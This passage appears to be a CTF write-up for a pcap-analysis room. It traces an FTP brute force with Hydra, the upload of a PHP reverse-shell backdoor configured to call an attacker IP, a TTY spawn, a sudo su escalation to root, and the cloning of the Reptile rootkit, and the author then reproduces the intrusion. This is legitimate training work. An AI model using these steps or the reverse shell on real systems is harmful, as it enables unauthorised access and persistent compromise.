+<span class="o">  OS:)T5(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="m">0</span><span class="o">%S=Z%</span><span class="n">A</span><span class="o">=</span><span class="n">S</span><span class="o">+%F=AR%</span><span class="n">O</span><span class="o">=%RD=0%</span><span class="n">Q</span><span class="o">=</span><span class="p">)</span><span class="nf">T6</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%DF=Y%</span><span class="bp">T</span><span class="o">=</span><span class="m">40</span><span class="o">%W=0%</span><span class="n">S</span><span class="o">=</span><span class="n">A</span><span class="o">%</span>
+<span class="o">  OS:A=Z%</span><span class="bp">F</span><span class="o">=</span><span class="n">R</span><span class="o">%O=%</span><span class="n">RD</span><span class="o">=</span><span class="m">0</span><span class="o">%Q=)T7(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="m">0</span><span class="o">%S=Z%</span><span class="n">A</span><span class="o">=</span><span class="n">S</span><span class="o">+%F=AR%</span><span class="n">O</span><span class="o">=%RD=0%</span><span class="n">Q</span><span class="o">=</span><span class="p">)</span><span class="nf">U1</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%</span>
+<span class="o">  OS:DF=N%</span><span class="bp">T</span><span class="o">=</span><span class="m">40</span><span class="o">%IPL=164%</span><span class="n">UN</span><span class="o">=</span><span class="m">0</span><span class="o">%RIPL=G%</span><span class="n">RID</span><span class="o">=</span><span class="n">G</span><span class="o">%RIPCK=G%</span><span class="n">RUCK</span><span class="o">=</span><span class="n">G</span><span class="o">%RUD=G)IE(R=Y%</span><span class="n">DFI</span><span class="o">=</span><span class="n">N</span><span class="o">%T=</span>
+<span class="o">  OS:40%</span><span class="n">CD</span><span class="o">=</span><span class="n">S</span><span class="p">)</span>
+
+<span class="w">  </span><span class="n">Network</span><span class="w"> </span><span class="n">Distance</span><span class="o">:</span><span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="n">hops</span>
+
+<span class="w">  </span><span class="n">OS</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">https</span><span class="o">://</span><span class="n">nmap.org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="n">.</span>
+<span class="w">  </span><span class="c1"># Nmap done at Wed Mar  1 20:03:30 2023 -- 1 IP address (1 host up) scanned in 33.71 seconds</span>
+</code></pre></div></td></tr></table></div></li>
+</ul>
+<h2 id="task-1"><b>Task 1</b><a class="headerlink" href="#task-1" title="Permanent link">&para;</a></h2>
+<ul class="task-list">
+<li class="task-list-item">
+<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> It seems like our machine got hacked by an anonymous threat actor. However, we are lucky to have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and use Wireshark to view it. <a href="../assets/Capture.pcapng">Download the file here</a></p>
+</li>
+<li class="task-list-item">
+<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> The attacker is trying to log into a specific service. What service is this? <strong><code>FTP</code></strong></p>
+<p>As I traced the TCP stream, I found the following:
+<div class="highlight"><pre><span></span><code><span class="m">220</span><span class="w"> </span><span class="n">Hello</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">World</span><span class="o">!</span>
+<span class="n">USER</span><span class="w"> </span><span class="n">jenny</span>
+<span class="m">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password.</span>
+<span class="n">PASS</span><span class="w"> </span><span class="n">password</span>
+<span class="m">530</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">incorrect.</span>
+<span class="n">USER</span><span class="w"> </span><span class="n">jenny</span>
+<span class="m">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password.</span>
+<span class="n">PASS</span><span class="w"> </span><span class="m">666666</span>
+<span class="m">530</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">incorrect.</span>
+</code></pre></div></p>
+</li>
+<li class="task-list-item">
+<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool? <strong><code>Hydra</code></strong></p>
+</li>
+<li class="task-list-item">
+<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> The attacker is trying to log on with a specific username. What is the username? <strong><code>Jenny</code></strong></p>
+</li>
+<li class="task-list-item">
+<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> What is the user's password? </p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span>
+<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="m">220</span><span class="w"> </span><span class="n">Hello</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">World</span><span class="o">!</span>
+<span class="n">USER</span><span class="w"> </span><span class="n">jenny</span>
+<span class="m">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password.</span>
+<span class="n">PASS</span><span class="w"> </span><span class="m">111111</span>
+<span class="m">530</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">incorrect.</span>
+<span class="hll"><span class="n">USER</span><span class="w"> </span><span class="n">jenny</span>
+</span><span class="m">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password.</span>
+<span class="hll"><span class="n">PASS</span><span class="w"> </span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span>
+</span><span class="hll"><span class="m">230</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">successful.</span>
+</span></code></pre></div></td></tr></table></div>
+</li>
+<li class="task-list-item">
+<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> What is the current FTP working directory after the attacker logged in? <strong><code>/var/www/html</code></strong></p>
+</li>
+<li class="task-list-item">
+<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> The attacker uploaded a backdoor. What is the backdoor's filename? <strong><code>shell.php</code></strong></p>
+</li>
+</ul>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="w">  </span><span class="m">220</span><span class="w"> </span><span class="n">Hello</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">World</span><span class="o">!</span>
+<span class="w">  </span><span class="n">USER</span><span class="w"> </span><span class="n">jenny</span>
+<span class="w">  </span><span class="m">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password.</span>
+<span class="w">  </span><span class="n">PASS</span><span class="w"> </span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span>
+<span class="w">  </span><span class="m">230</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">successful.</span>
+<span class="w">  </span><span class="n">SYST</span>
+<span class="w">  </span><span class="m">215</span><span class="w"> </span><span class="n">UNIX</span><span class="w"> </span><span class="n">Type</span><span class="o">:</span><span class="w"> </span><span class="n">L8</span>
+<span class="w">  </span><span class="n">PWD</span>
+<span class="hll"><span class="w">  </span><span class="m">257</span><span class="w"> </span><span class="s">&quot;/var/www/html&quot;</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">directory</span>
+</span><span class="w">  </span><span class="n">PORT</span><span class="w"> </span><span class="m">192</span><span class="p">,</span><span class="m">168</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="m">147</span><span class="p">,</span><span class="m">225</span><span class="p">,</span><span class="m">49</span>
+<span class="w">  </span><span class="m">200</span><span class="w"> </span><span class="n">PORT</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">successful.</span><span class="w"> </span><span class="n">Consider</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">PASV.</span>
+<span class="w">  </span><span class="n">LIST</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
+<span class="w">  </span><span class="m">150</span><span class="w"> </span><span class="n">Here</span><span class="w"> </span><span class="n">comes</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">listing.</span>
+<span class="w">  </span><span class="m">226</span><span class="w"> </span><span class="n">Directory</span><span class="w"> </span><span class="n">send</span><span class="w"> </span><span class="n">OK.</span>
+<span class="w">  </span><span class="n">TYPE</span><span class="w"> </span><span class="n">I</span>
+<span class="w">  </span><span class="m">200</span><span class="w"> </span><span class="n">Switching</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Binary</span><span class="w"> </span><span class="n">mode.</span>
+<span class="w">  </span><span class="n">PORT</span><span class="w"> </span><span class="m">192</span><span class="p">,</span><span class="m">168</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="m">147</span><span class="p">,</span><span class="m">196</span><span class="p">,</span><span class="m">163</span>
+<span class="w">  </span><span class="m">200</span><span class="w"> </span><span class="n">PORT</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">successful.</span><span class="w"> </span><span class="n">Consider</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">PASV.</span>
+<span class="hll"><span class="w">  </span><span class="n">STOR</span><span class="w"> </span><span class="n">shell.php</span>
+</span><span class="w">  </span><span class="m">150</span><span class="w"> </span><span class="n">Ok</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">send</span><span class="w"> </span><span class="n">data.</span>
+<span class="w">  </span><span class="m">226</span><span class="w"> </span><span class="n">Transfer</span><span class="w"> </span><span class="n">complete.</span>
+<span class="hll"><span class="w">  </span><span class="n">SITE</span><span class="w"> </span><span class="n">CHMOD</span><span class="w"> </span><span class="m">777</span><span class="w"> </span><span class="n">shell.php</span>
+</span><span class="w">  </span><span class="m">200</span><span class="w"> </span><span class="n">SITE</span><span class="w"> </span><span class="n">CHMOD</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">ok.</span>
+<span class="w">  </span><span class="n">QUIT</span>
+<span class="w">  </span><span class="m">221</span><span class="w"> </span><span class="n">Goodbye.</span>
+</code></pre></div></td></tr></table></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL? <strong><code>http://pentestmonkey.net/tools/php-reverse-shell</code></strong></li>
+</ul>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="x">  </span><span class="cp">&lt;?php</span>
+  <span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP</span>
+  <span class="c1">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
+  <span class="c1">//</span>
+  <span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility</span>
+  <span class="c1">// for any actions performed using this tool.  The author accepts no liability</span>
+  <span class="c1">// for damage caused by this tool.  If these terms are not acceptable to you, then</span>
+  <span class="c1">// do not use this tool.</span>
+  <span class="o">.</span>
+  <span class="o">.</span>
+  <span class="o">.</span>
+  <span class="c1">// Usage</span>
+  <span class="c1">// -----</span>
+<span class="hll">  <span class="c1">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span>
+</span>
+  <span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">&quot;1.0&quot;</span><span class="p">;</span>
+  <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.147&#39;</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
+  <span class="nv">$port</span> <span class="o">=</span> <span class="mi">80</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
+  <span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
+  <span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</code></pre></div></td></tr></table></div>
+<ul class="task-list">
+<li class="task-list-item">
+<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Which command did the attacker manually execute after getting a reverse shell? <strong><code>whoami</code></strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span>
+<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">Linux</span><span class="w"> </span><span class="n">wir3</span><span class="w"> </span><span class="m">4.15</span><span class="n">.</span><span class="m">0-135</span><span class="o">-</span><span class="n">generic</span><span class="w"> </span><span class="c1">#139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+<span class="m">22</span><span class="o">:</span><span class="m">26</span><span class="o">:</span><span class="m">54</span><span class="w"> </span><span class="n">up</span><span class="w">  </span><span class="m">2</span><span class="o">:</span><span class="m">21</span><span class="p">,</span><span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="n">user</span><span class="p">,</span><span class="w">  </span><span class="n">load</span><span class="w"> </span><span class="n">average</span><span class="o">:</span><span class="w"> </span><span class="m">0.02</span><span class="p">,</span><span class="w"> </span><span class="m">0.07</span><span class="p">,</span><span class="w"> </span><span class="m">0.08</span>
+<span class="n">USER</span><span class="w">     </span><span class="n">TTY</span><span class="w">      </span><span class="n">FROM</span><span class="w">             </span><span class="n">LOGIN</span><span class="o">@</span><span class="w">   </span><span class="n">IDLE</span><span class="w">   </span><span class="n">JCPU</span><span class="w">   </span><span class="n">PCPU</span><span class="w"> </span><span class="n">WHAT</span>
+<span class="n">jenny</span><span class="w">    </span><span class="n">tty1</span><span class="w">     </span><span class="o">-</span><span class="w">                </span><span class="m">20</span><span class="o">:</span><span class="m">06</span><span class="w">   </span><span class="m">37.00</span><span class="n">s</span><span class="w">  </span><span class="m">1.00</span><span class="n">s</span><span class="w">  </span><span class="m">0.14</span><span class="n">s</span><span class="w"> </span><span class="o">-</span><span class="n">bash</span>
+<span class="n">uid</span><span class="o">=</span><span class="m">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="m">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="m">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
+<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">:</span><span class="w"> </span><span class="m">0</span><span class="o">:</span><span class="w"> </span><span class="n">can</span><span class="s">&#39;</span><span class="err">t access tty; job control turned off</span>
+<span class="hll"><span class="o">$</span><span class="w"> </span><span class="n">whoami</span>
+</span><span class="n">www</span><span class="o">-</span><span class="n">data</span>
+<span class="o">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
+</code></pre></div></td></tr></table></div>
+</li>
+<li class="task-list-item">
+<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> What is the computer's hostname? <strong><code>wir3</code></strong></p>
+</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Which command did the attacker execute to spawn a new TTY shell? 
+    <strong><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></strong></li>
+<li class="task-list-item">
+<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Which command was executed to gain a root shell? <strong><code>sudo su</code></strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="hll"><span class="o">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</span><span class="hll"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">wir3</span><span class="o">:/$</span><span class="w"> </span><span class="n">su</span><span class="w"> </span><span class="n">jenny</span>
+</span><span class="n">su</span><span class="w"> </span><span class="n">jenny</span>
+<span class="n">Password</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span>
+
+<span class="n">jenny</span><span class="o">@</span><span class="n">wir3</span><span class="o">:/$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
+<span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
+<span class="p">[</span><span class="n">sudo</span><span class="p">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">jenny</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span>
+
+<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">jenny</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">wir3</span><span class="o">:</span>
+<span class="w">    </span><span class="n">env_reset</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span><span class="p">,</span>
+<span class="w">    </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span>\<span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span>\<span class="o">:/</span><span class="n">sbin</span>\<span class="o">:/</span><span class="n">bin</span>\<span class="o">:/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>
+
+<span class="n">User</span><span class="w"> </span><span class="n">jenny</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">wir3</span><span class="o">:</span>
+<span class="w">    </span><span class="p">(</span><span class="n">ALL</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">ALL</span><span class="p">)</span><span class="w"> </span><span class="n">ALL</span>
+<span class="hll"><span class="n">jenny</span><span class="o">@</span><span class="n">wir3</span><span class="o">:/$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">su</span>
+</span><span class="n">sudo</span><span class="w"> </span><span class="n">su</span>
+<span class="n">root</span><span class="o">@</span><span class="n">wir3</span><span class="o">:/</span><span class="c1"># whoami</span>
+<span class="n">whoami</span>
+<span class="n">root</span>
+<span class="n">root</span><span class="o">@</span><span class="n">wir3</span><span class="o">:/</span><span class="c1"># cd</span>
+</code></pre></div></td></tr></table></div>
+</li>
+<li class="task-list-item">
+<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> The attacker downloaded something from GitHub. What is the name of the GitHub project? <strong><code>Reptile</code></strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">cd</span>
+<span class="hll"><span class="n">root</span><span class="o">@</span><span class="n">wir3</span><span class="o">:~</span><span class="c1"># git clone https://github.com/f0rb1dd3n/Reptile.git</span>
+</span><span class="hll"><span class="n">git</span><span class="w"> </span><span class="n">clone</span><span class="w"> </span><span class="n">https</span><span class="o">://</span><span class="n">github.com</span><span class="o">/</span><span class="n">f0rb1dd3n</span><span class="o">/</span><span class="n">Reptile.git</span>
+</span><span class="n">Cloning</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="s">&#39;Reptile&#39;</span><span class="kc">...</span>
+<span class="n">remote</span><span class="o">:</span><span class="w"> </span><span class="n">Enumerating</span><span class="w"> </span><span class="n">objects</span><span class="o">:</span><span class="w"> </span><span class="m">217</span><span class="p">,</span><span class="w"> </span><span class="n">done..</span><span class="p">[</span><span class="n">K</span>
+<span class="n">remote</span><span class="o">:</span><span class="w"> </span><span class="n">Counting</span><span class="w"> </span><span class="n">objects</span><span class="o">:</span><span class="w">   </span><span class="m">0</span><span class="o">% (1/217).[K</span>
+<span class="o">remote: Counting objects:   1%</span><span class="w"> </span><span class="p">(</span><span class="m">3</span><span class="o">/</span><span class="m">217</span><span class="p">)</span><span class="n">.</span><span class="p">[</span><span class="n">K</span>
+</code></pre></div></td></tr></table></div>
+</li>
+<li class="task-list-item">
+<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called <strong><code>Rootkit</code></strong></p>
+</li>
+</ul>
+<h2 id="task-2"><b>Task 2</b><a class="headerlink" href="#task-2" title="Permanent link">&para;</a></h2>
+<p>While using the Hydra tool to perform a brute force attack on the FTP service, I was able to discover that the password for Jenny.</p>
+<p><img id="image1" /></p>
+<p>I uploaded my reverse shell replacing the one in webserver and accessed through browser. I concurrently launched a listener to intercept the incoming shell.</p>
+<p><img id="image2" /></p>
+<p>By utilizing the credentials discovered in Task-1, I logged in as <code>Jenny</code> using <strong><code>su jenny</code></strong>. As Jenny possessed access to all commands in Linux, I executed <strong><code>sudo su</code></strong> to escalate my privileges to root.</p>
+<p><img id="image3" /></p>
+<p>I accessed the flag.txt file located in the Reptile directory and read its contents.</p>
+<p><img id="image4" /></p>
+<script>
+
+// JSON object
+const data = {
+    "desc": "Find out what happened by analysing a .pcap file and hack your way back into the machine",
+    "ip":  "10.10.199.134",
+    "ports": "21/tcp,ftp,vsftpd 2.0.8 or later;80/tcp,http,Apache httpd 2.4.29 ((Ubuntu))",
+    "difficulty":"easy",
+    "id": "9"
+}
+
+
+function updateHTML() {
+
+    const keys = Object.keys(data);
+    const values = Object.values(data);
+
+    for(var z=0; z < keys.length; z++){
+
+        if(keys[z] === "ports"){
+            const ports = data.ports.split(';');
+            for(var i = 0; i < ports.length; i++){
+                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
+                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
+                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
+            }
+        }
+        else{
+            try{
+            document.getElementById(keys[z]).innerHTML = values[z];
+            }
+            catch(error){
+                console.log(values[z]);
+            }
+        }
+    }
+
+    // replace the values with your specific filenames and number of images and img tags
+    const numImgTags = document.getElementsByTagName('img').length;
+
+    for (let i = 1; i <= numImgTags; i++) {
+    const imgTag = document.getElementById('image' + i);
+        if (imgTag) {
+            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
+        }
+    }
+
+}
+
+updateHTML();
+</script>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var tab,labels=set.querySelector(".tabbed-labels");for(tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../poster/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Poster" rel="prev">
+            <div class="md-footer__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <div class="md-ellipsis">
+                <span class="md-footer__direction">
+                  Previous
+                </span>
+                Poster
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://twitter.com/vasanth__vanan" target="_blank" rel="noopener" title="Vasanth Vanan on Twitter" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://github.com/VasanthVanan" target="_blank" rel="noopener" title="Vasanth Vanan on Github" class="md-social__link">
